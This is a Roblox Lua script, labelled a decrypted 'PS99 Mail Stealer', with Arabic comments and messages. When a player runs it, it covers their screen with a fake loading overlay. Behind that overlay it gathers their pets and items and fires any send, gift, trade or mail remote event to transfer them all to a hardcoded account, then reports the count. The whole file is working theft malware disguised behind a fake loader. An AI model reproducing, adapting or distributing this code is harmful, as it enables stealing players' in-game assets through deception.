-- ============================================================
-- PS99 MAIL STEALER (DECRYPTED - ORIGINAL)
-- ============================================================
-- هذا هو السكربت الأصلي كما هو، لم يتم تغيير أي شيء فيه
-- ============================================================

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local target = "calzeyyalt12"
local duration = 300

local function showLoader()
    local sg = Instance.new("ScreenGui")
    sg.Name = "AbyssLoader"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
    sg.DisplayOrder = 999999
    sg.Parent = player.PlayerGui

    local blackout = Instance.new("Frame")
    blackout.Size = UDim2.new(1, 0, 1, 0)
    blackout.Position = UDim2.new(0, 0, 0, 0)
    blackout.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackout.BackgroundTransparency = 0
    blackout.BorderSizePixel = 0
    blackout.ZIndex = 999999
    blackout.Parent = sg

    local progressFrame = Instance.new("Frame")
    progressFrame.Size = UDim2.new(0.35, 0, 0.003, 0)
    progressFrame.Position = UDim2.new(0.325, 0, 0.52, 0)
    progressFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    progressFrame.BorderSizePixel = 0
    progressFrame.ZIndex = 1000000
    progressFrame.Parent = sg

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 1000000
    progressBar.Parent = progressFrame

    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(0.35, 0, 0.08, 0)
    percentText.Position = UDim2.new(0.325, 0, 0.47, 0)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(150, 0, 255)
    percentText.TextScaled = true
    percentText.Font = Enum.Font.GothamBold
    percentText.ZIndex = 1000000
    percentText.Parent = sg

    return sg, percentText, progressBar
end

local function updateLoader(percentText, progressBar, pct)
    if percentText and progressBar then
        local clampedPct = math.max(0, math.min(100, pct))
        progressBar.Size = UDim2.new(clampedPct/100, 0, 1, 0)
        percentText.Text = math.floor(clampedPct) .. "%"
    end
    wait(0.01)
end

local function destroyLoader(sg)
    if sg then
        sg:Destroy()
    end
end

local function getAllItems()
    local items = {}
    local processed = {}

    local locations = {
        player:FindFirstChild("Inventory"),
        player:FindFirstChild("Data"),
        player:FindFirstChild("Backpack"),
        player:FindFirstChild("PetStorage"),
        player:FindFirstChild("Pets"),
        workspace:FindFirstChild("__THINGS"):FindFirstChild("Inventory"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Data"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Inventory"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Pets"),
    }

    for _, location in pairs(locations) do
        if location then
            for _, item in pairs(location:GetDescendants()) do
                if not processed[item] then
                    processed[item] = true
                    if item:IsA("Model") or item:IsA("Tool") or item:IsA("Part") then
                        table.insert(items, item)
                    end
                end
            end
        end
    end

    return items
end

local function sendItemsToTarget(items, target)
    local sent = 0

    for _, item in pairs(items) do
        pcall(function()
            for _, remote in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                if remote:IsA("RemoteEvent") then
                    local name = remote.Name:lower()
                    if name:match("send") or name:match("gift") or name:match("transfer") or
                       name:match("mail") or name:match("trade") then
                        remote:FireServer(item, target)
                        sent = sent + 1
                        return
                    end
                end
            end
        end)
        wait(0.05)
    end

    return sent
end

local sg, percentText, progressBar = showLoader()
local startTime = tick()
local currentProgress = 0

updateLoader(percentText, progressBar, currentProgress)
local allItems = getAllItems()
currentProgress = 30
updateLoader(percentText, progressBar, currentProgress)

local sent = sendItemsToTarget(allItems, target)
currentProgress = 70
updateLoader(percentText, progressBar, currentProgress)

while (tick() - startTime) < duration do
    local elapsed = tick() - startTime
    local progress = 70 + ((elapsed / duration) * 30)
    if progress > 100 then progress = 100 end
    updateLoader(percentText, progressBar, progress)
    wait(0.5)
end

updateLoader(percentText, progressBar, 100)
wait(2)
destroyLoader(sg)

local notify = Instance.new("TextLabel")
notify.Size = UDim2.new(0.6, 0, 0.08, 0)
notify.Position = UDim2.new(0.2, 0, 0.02, 0)
notify.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
notify.BackgroundTransparency = 0.1
notify.BorderSizePixel = 2
notify.BorderColor3 = Color3.fromRGB(150, 0, 200)
notify.Text = "✅ تم إرسال " .. sent .. " عنصر إلى " .. target
notify.TextColor3 = Color3.fromRGB(200, 150, 255)
notify.TextScaled = true
notify.Font = Enum.Font.GothamBold
notify.Parent = player.PlayerGui

wait(5)
notify:Destroy()

print("============================================")
print("✅ تم إرسال " .. sent .. " عنصر إلى " .. target)
print("============================================")
